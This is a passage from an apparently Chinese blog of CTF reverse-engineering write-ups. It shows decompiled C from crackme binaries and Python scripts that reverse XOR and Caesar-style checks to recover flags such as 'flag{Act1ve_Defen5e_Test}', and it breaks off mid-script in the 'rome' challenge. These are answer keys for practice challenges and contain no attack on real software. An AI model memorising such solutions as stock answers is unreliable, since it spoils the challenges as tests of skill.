      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token punctuation">(</span>v15<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> i<span class="token punctuation">)</span> <span class="token operator">!=</span> v12<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        result <span class="token operator">=</span> <span class="token number">4294967294LL</span><span class="token punctuation">;</span>
        <span class="token keyword">goto</span> LABEL_13<span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">sub_410CC0</span><span class="token punctuation">(</span><span class="token string">"continue!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memset</span><span class="token punctuation">(</span>v18<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x40uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    v18<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token function">sub_4406E0</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> v18<span class="token punctuation">,</span> <span class="token number">64LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    v18<span class="token punctuation">[</span><span class="token number">39</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sub_424BA0</span><span class="token punctuation">(</span>v18<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">39</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      v2 <span class="token operator">=</span> <span class="token function">sub_400E44</span><span class="token punctuation">(</span>v18<span class="token punctuation">)</span><span class="token punctuation">;</span>
      v3 <span class="token operator">=</span> <span class="token function">sub_400E44</span><span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>
      v4 <span class="token operator">=</span> <span class="token function">sub_400E44</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
      v5 <span class="token operator">=</span> <span class="token function">sub_400E44</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
      v6 <span class="token operator">=</span> <span class="token function">sub_400E44</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
      v7 <span class="token operator">=</span> <span class="token function">sub_400E44</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>
      v8 <span class="token operator">=</span> <span class="token function">sub_400E44</span><span class="token punctuation">(</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>
      v9 <span class="token operator">=</span> <span class="token function">sub_400E44</span><span class="token punctuation">(</span>v8<span class="token punctuation">)</span><span class="token punctuation">;</span>
      v10 <span class="token operator">=</span> <span class="token function">sub_400E44</span><span class="token punctuation">(</span>v9<span class="token punctuation">)</span><span class="token punctuation">;</span>
      v11 <span class="token operator">=</span> <span class="token function">sub_400E44</span><span class="token punctuation">(</span>v10<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_400360</span><span class="token punctuation">(</span>v11<span class="token punctuation">,</span> off_6CC090<span class="token punctuation">)</span> <span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        <span class="token function">sub_410CC0</span><span class="token punctuation">(</span><span class="token string">"You found me!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">sub_410CC0</span><span class="token punctuation">(</span><span class="token string">"bye bye~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      result <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">&#123;</span>
      result <span class="token operator">=</span> <span class="token number">4294967293LL</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">&#123;</span>
    result <span class="token operator">=</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
LABEL_13<span class="token operator">:</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">!=</span> v19 <span class="token punctuation">)</span>
    <span class="token function">sub_444020</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这个函数似乎是个坑，本来我是不太会的，看了wp，原来是下面的这里的内容进行了10次base64解密会获得一个看雪某版主的一篇文章，而那篇文章对解这道题是无用的</p>
<p><img src="/2021/05/28/CTF/image-20210531125151809.png" alt="image-20210531125151809"></p>
<p>然后继续向下看，发现字符串<code>byte_6CC0A0</code>，点进去函数，发现这个才是真正的可以获得flag的函数</p>
<p><img src="/2021/05/28/CTF/image-20210531130338935.png" alt="image-20210531130338935"></p>
<p>发现该函数对应的反编译出的c语言的代码如下</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">sub_400D35</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">unsigned</span> __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-24h]</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-20h]</span>
  <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [rsp+14h] [rbp-1Ch]</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+24h] [rbp-Ch]</span>
  <span class="token keyword">unsigned</span> __int64 v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-8h]</span>

  v5 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token string">'('</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v1 <span class="token operator">=</span> <span class="token function">sub_43FD20</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">)</span> <span class="token operator">-</span> qword_6CEE38<span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">1233</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">sub_40F790</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">sub_40FE60</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">sub_40FE60</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    v1 <span class="token operator">=</span> <span class="token function">sub_40FE60</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x98765432</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  v4 <span class="token operator">=</span> v1<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>v1 <span class="token operator">^</span> byte_6CC0A0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'f'</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">HIBYTE</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>byte_6CC0A3<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'g'</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">24</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>
      <span class="token function">sub_410E90</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token punctuation">(</span>byte_6CC0A0<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v4 <span class="token operator">+</span> j <span class="token operator">%</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  result <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> result <span class="token punctuation">)</span>
    <span class="token function">sub_444020</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>上面这个异或实际上不起任何作用</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">1233</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">sub_40F790</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">sub_40FE60</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">sub_40FE60</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    v1 <span class="token operator">=</span> <span class="token function">sub_40FE60</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x98765432</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  v4 <span class="token operator">=</span> v1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>异或偶数次还是异或前的内容，所以只需要对于v4，只满足</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>v1 <span class="token operator">^</span> byte_6CC0A0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'f'</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">HIBYTE</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>byte_6CC0A3<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'g'</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>与<code>6CC0A0</code>的前四位字符异或后等于<code>flag</code>即可，这里直接写脚本爆破v4与flag</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">l1 <span class="token operator">=</span> <span class="token string">'@5 V]'</span> <span class="token operator">+</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'"E'</span> <span class="token operator">+</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0x17</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'/$nb&lt;'</span> <span class="token operator">+</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0x27</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'THl$nr&lt;2E['</span>
f1 <span class="token operator">=</span> <span class="token string">'flag'</span>
key <span class="token operator">=</span> <span class="token string">''</span>
f2 <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">:</span>
    key <span class="token operator">+=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span>f1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">ord</span><span class="token punctuation">(</span>l1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token operator">:</span>
    f2 <span class="token operator">+=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span>l1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token function">print</span><span class="token punctuation">(</span>f2<span class="token punctuation">)</span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">flag</span><span class="token expression"><span class="token punctuation">&#123;</span>Act1ve_Defen5e_Test<span class="token punctuation">&#125;</span></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="ACTF新生赛2020-rome"><a href="#ACTF新生赛2020-rome" class="headerlink" title="[ACTF新生赛2020]rome"></a>[ACTF新生赛2020]rome</h3><p>查字符串找到主要函数</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax</span>
  <span class="token keyword">int</span> v1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+14h] [ebp-44h]</span>
  <span class="token keyword">unsigned</span> __int8 v2<span class="token punctuation">;</span> <span class="token comment">// [esp+24h] [ebp-34h] BYREF</span>
  <span class="token keyword">unsigned</span> __int8 v3<span class="token punctuation">;</span> <span class="token comment">// [esp+25h] [ebp-33h]</span>
  <span class="token keyword">unsigned</span> __int8 v4<span class="token punctuation">;</span> <span class="token comment">// [esp+26h] [ebp-32h]</span>
  <span class="token keyword">unsigned</span> __int8 v5<span class="token punctuation">;</span> <span class="token comment">// [esp+27h] [ebp-31h]</span>
  <span class="token keyword">unsigned</span> __int8 v6<span class="token punctuation">;</span> <span class="token comment">// [esp+28h] [ebp-30h]</span>
  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// [esp+29h] [ebp-2Fh]</span>
  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// [esp+2Dh] [ebp-2Bh]</span>
  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// [esp+31h] [ebp-27h]</span>
  <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment">// [esp+35h] [ebp-23h]</span>
  <span class="token keyword">unsigned</span> __int8 v11<span class="token punctuation">;</span> <span class="token comment">// [esp+39h] [ebp-1Fh]</span>
  <span class="token keyword">char</span> v12<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+3Bh] [ebp-1Dh] BYREF</span>

  <span class="token function">strcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token string">"Qsw3sj_lz4_Ujw@l"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please input:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  result <span class="token operator">=</span> v2<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">==</span> <span class="token string">'A'</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    result <span class="token operator">=</span> v3<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">==</span> <span class="token string">'C'</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      result <span class="token operator">=</span> v4<span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">==</span> <span class="token string">'T'</span> <span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        result <span class="token operator">=</span> v5<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">==</span> <span class="token string">'F'</span> <span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
          result <span class="token operator">=</span> v6<span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">==</span> <span class="token string">'&#123;'</span> <span class="token punctuation">)</span>
          <span class="token punctuation">&#123;</span>
            result <span class="token operator">=</span> v11<span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span> v11 <span class="token operator">==</span> <span class="token string">'&#125;'</span> <span class="token punctuation">)</span>
            <span class="token punctuation">&#123;</span>
              v1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>
              v1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v8<span class="token punctuation">;</span>
              v1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> v9<span class="token punctuation">;</span>
              v1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> v10<span class="token punctuation">;</span>
              <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
              <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">15</span> <span class="token punctuation">)</span>
              <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">64</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">90</span> <span class="token punctuation">)</span>
                  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">51</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">65</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">96</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">122</span> <span class="token punctuation">)</span>
                  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">79</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">;</span>
                <span class="token operator">++</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
              <span class="token punctuation">&#125;</span>
              <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
              <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">15</span> <span class="token punctuation">)</span>
              <span class="token punctuation">&#123;</span>
                result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>v12<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token punctuation">(</span>_BYTE<span class="token punctuation">)</span>result <span class="token punctuation">)</span>
                  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
                <span class="token operator">++</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
              <span class="token punctuation">&#125;</span>
              result <span class="token operator">=</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"You are correct!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
          <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以看到只是一个简单的算法，直接得脚本</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> string
v12 <span class="token operator">=</span> <span class="token string">'Qsw3sj_lz4_Ujw@l'</span>
flag <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> string<span class="token punctuation">.</span>printable<span class="token punctuation">:</span>  <span class="token comment"># ascii表上有127个字符，一个一个试吧</span>
        j <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
        x <span class="token operator">=</span> j
